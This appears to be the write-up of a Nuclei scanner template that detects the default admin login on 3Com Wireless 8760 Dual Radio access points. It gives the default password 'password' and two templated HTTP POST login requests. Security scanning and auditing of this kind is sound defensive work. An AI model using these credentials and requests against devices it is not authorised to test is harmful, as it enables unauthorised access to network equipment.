# Nuclei Template: 3Com Wireless 8760 Dual Radio - Default Login
**Template ID:** 3Com-wireless-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`3Com-wireless-default-login.yaml`)

## Vulnerability Information & PoC

## Description
3COM Wireless 8760 Dual Radio contains a default login vulnerability. Default admin login password 'password' was found.

## Steps to reproduce / Exploit Payload
```http
POST /index.htm HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userid={{username}}&passwd={{password}}&Submit=LOGIN

POST /login.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}
```

## References
- https://www.speedguide.net/routers/3com-wl-546-3com-wireless-8760-dual-radio-11abg-1256
